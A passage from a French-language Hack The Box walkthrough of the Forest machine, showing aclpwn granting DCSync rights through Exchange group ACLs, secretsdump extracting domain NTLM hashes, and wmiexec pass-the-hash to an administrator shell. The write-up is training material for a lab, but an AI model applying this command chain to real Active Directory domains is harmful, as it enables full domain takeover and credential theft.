Path <span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>: <span style="color:#f92672">(</span>SVC-ALFRESCO@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>SERVICE ACCOUNTS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>PRIVILEGED IT ACCOUNTS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>ACCOUNT OPERATORS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>GenericAll<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>WriteDacl<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>HTB.LOCAL<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Path found!
Path <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: <span style="color:#f92672">(</span>SVC-ALFRESCO@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>SERVICE ACCOUNTS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>PRIVILEGED IT ACCOUNTS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>ACCOUNT OPERATORS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>GenericAll<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>WriteDacl<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>HTB.LOCAL<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Unsupported operation: GetChanges on HTB.LOCAL <span style="color:#f92672">(</span>Domain<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Invalid path, skipping
Please choose a path <span style="color:#f92672">[</span>0-1<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Path validated, the following modifications are required <span style="color:#66d9ef">for</span> exploitation in the current configuration:
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Adding user svc-alfresco to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Modifying domain DACL to give DCSync rights to svc-alfresco
</code></pre></div><p>Ainsi, deux potentiels chemins de compromission sont identifiés.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python aclpwn.py -f svc-alfresco@htb.local -ft user -d htb.local -u svc-alfresco -p s3rvice -sp s3rvice -du neo4j -dp xxxx    
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Path found!
Path <span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>: <span style="color:#f92672">(</span>SVC-ALFRESCO@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>SERVICE ACCOUNTS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>PRIVILEGED IT ACCOUNTS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>ACCOUNT OPERATORS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>GenericAll<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>WriteDacl<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>HTB.LOCAL<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Path found!
Path <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: <span style="color:#f92672">(</span>SVC-ALFRESCO@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>SERVICE ACCOUNTS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>PRIVILEGED IT ACCOUNTS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>ACCOUNT OPERATORS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>GenericAll<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>MemberOf<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>WriteDacl<span style="color:#f92672">]</span>-&gt;<span style="color:#f92672">(</span>HTB.LOCAL<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Unsupported operation: GetChanges on HTB.LOCAL <span style="color:#f92672">(</span>Domain<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Invalid path, skipping
Please choose a path <span style="color:#f92672">[</span>0-1<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Memberof -&gt; <span style="color:#66d9ef">continue</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Memberof -&gt; <span style="color:#66d9ef">continue</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Memberof -&gt; <span style="color:#66d9ef">continue</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Adding user svc-alfresco to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Added CN<span style="color:#f92672">=</span>svc-alfresco,OU<span style="color:#f92672">=</span>Service Accounts,DC<span style="color:#f92672">=</span>htb,DC<span style="color:#f92672">=</span>local as member to CN<span style="color:#f92672">=</span>Exchange Trusted Subsystem,OU<span style="color:#f92672">=</span>Microsoft Exchange Security Groups,DC<span style="color:#f92672">=</span>htb,DC<span style="color:#f92672">=</span>local
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Switching context to svc-alfresco
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Done switching context
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Memberof -&gt; <span style="color:#66d9ef">continue</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Modifying domain DACL to give DCSync rights to svc-alfresco
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dacl modification successful
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished running tasks
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved restore state to aclpwn-20191110-170221.restore
</code></pre></div><p>Les droits étant acquis, il est maintenant possible d&rsquo;effectuer des actions privilégiées telles que dumper la base NTDS de l&rsquo;AD. l&rsquo;outil <code>secretsdump</code> de Impacket permet également de réaliser cette action à distance.</p>
<p><strong>NOTE :</strong> Pour une raison que j&rsquo;ignore également (mesure de protection pour la machine ?), les droits DCSync ne semblent accordés à l&rsquo;utilisateur que pour une courte période (&lt;2 minutes).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.21-dev - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
htb.local<span style="color:#ae81ff">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\$</span>331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\S</span>M_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local<span style="color:#ae81ff">\H</span>ealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local<span style="color:#ae81ff">\s</span>ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local<span style="color:#ae81ff">\l</span>ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local<span style="color:#ae81ff">\s</span>vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local<span style="color:#ae81ff">\a</span>ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local<span style="color:#ae81ff">\m</span>ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local<span style="color:#ae81ff">\s</span>anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:7a1287ef194e7084fdf1ace622c83605:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up... 
</code></pre></div><p>Les hashs NTLM des utilisateurs en notre possession, il est maintenant possible de se connecter à la machine en administrateur ! Merci le <code>Pass the Hash</code> ;)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python wmiexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.21-dev - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBv3.0 dialect used
whoami
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Launching semi-interactive shell - Careful what you execute
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
C:<span style="color:#ae81ff">\&gt;</span>whoami
htb<span style="color:#ae81ff">\a</span>dministrator

C:<span style="color:#ae81ff">\&gt;</span>type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
f048153f202bbb2f82622b04d79129cc
</code></pre></div><p>w00ted !</p>
  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="/fr/walkthroughs/hackthebox/jarvis/" class="post--navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Hack The Box - Jarvis</span>
    </a>
    
    
    <a href="/fr/walkthroughs/hackthebox/resolute/" class="post--navigation-next">
      <span class="navigation-tittle">Hack The Box - Resolute</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>


    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
